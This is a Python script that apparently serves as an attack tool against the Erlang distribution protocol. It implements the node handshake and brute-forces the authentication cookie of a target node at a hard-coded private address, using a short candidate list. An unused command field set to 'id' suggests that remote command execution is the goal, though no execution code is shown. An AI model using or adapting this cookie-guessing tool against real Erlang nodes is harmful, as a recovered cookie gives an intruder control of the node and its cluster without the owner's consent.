#python3 erldp for otp 25
from struct import pack, unpack
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from binascii import hexlify, unhexlify
from random import choice, random
from string import ascii_uppercase
import string
'''
pack 格式对应表
https://www.codenong.com/cs106313977/
'''

class Erldp:
    def __init__(self,host:string,port:int,cookie:bytes,cmd:string):
        self.host = host
        self.port = port
        self.cookie = cookie
        self.cmd = cmd
    def setCookie(self,cookie:bytes):
        self.cookie = cookie

    def _connect(self):
        self.sock = socket(AF_INET,SOCK_STREAM,0)
        self.sock.settimeout(1)
        assert(self.sock)
        self.sock.connect((self.host,self.port))

    def rand_id(self,n=6):
        return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

    # 注意，这里的challenge是str.encode(str(int.from_bytes(challenge,"big")))
    def getDigest(self,cookie:bytes,challenge:int):
        challenge = str.encode(str(challenge))
        m = md5()
        m.update(cookie)
        m.update(challenge)
        return m.digest()
    def getRandom(self):
        r = int(random() * (2**32))
        return int.to_bytes(r,4,"big")
    def isErlDp(self):
        try:
            self._connect()
        except:
            print("[!]%s:%s tcp连接失败" % (self.host,self.port))
            return False
        try:
            self._handshake_step1()
        except:
            print("[!]%s:%s不是erldp" % (self.host,self.port))
            return False
        print("[*]%s:%s是erldp" % (self.host,self.port))
        return True
        
    def _handshake_step1(self):
        
        self.name = self.rand_id()
        packet = pack('!Hc8s4sH', 1+8+4+2+len(self.name), b'N', b"\x00\x00\x00\x01\x03\xdf\x7f\xbd",b"\x63\x15\x95\x8c", len(self.name)) + str.encode(self.name)
        self.sock.sendall(packet)
        (res_packet_len,) = unpack(">H",self.sock.recv(2))
        (tag,status) = unpack("1s2s",self.sock.recv(res_packet_len))
        assert(tag == b"s")
        assert(status == b"ok")
        print("step1 end:发送node1 name成功")

    def _handshake_step2(self):
        (res_packet_len,) = unpack(">H",self.sock.recv(2))
        data = self.sock.recv(res_packet_len)
        tag = data[0:1]
        flags = data[1:9]
        self.node2_challenge = int.from_bytes(data[9:13],"big")
        node2_creation = data[13:17]
        node2_name_len = int.from_bytes(data[17:19],"big")
        self.node2_name = data[19:]
        assert(tag == b"N")
        print("step2 end:接收node2 name成功")

    def _handshake_step3(self):
        node1_digest = self.getDigest(self.cookie,self.node2_challenge)
        self.node1_challenge = self.getRandom()
        packet2 = pack("!H1s4s16s",21,b"r",self.node1_challenge,node1_digest)
        self.sock.sendall(packet2)
        (res_packet_len,) = unpack(">H",self.sock.recv(2))
        (tag,node2_digest) = unpack("1s16s",self.sock.recv(res_packet_len))

        assert(tag == b"a")
        test_node2_digest = self.getDigest(self.cookie,self.node1_challenge)
        # assert(node2_digest == test_node2_digest)
        print("step3 end:验证md5成功，握手结束")


    def handshake(self):
        self._connect()
        self._handshake_step1()
        self._handshake_step2()
        self._handshake_step3()

        print("handshake done")


erldp = Erldp("192.168.245.121",45357,b"KEQXWCAPVBRCYCIOANCC","id")
erldp.isErlDp()
passList = [b"12345",b"55666",b"KEQXWCAPVBRCYCIOANCC"]

for item in passList:
    try:
        erldp.setCookie(item)
        erldp.handshake()
    except:
        print(b"[!]failed "+item)
        continue
    print(b"[*] success "+item)
print("done")
erldp.isErlDp()


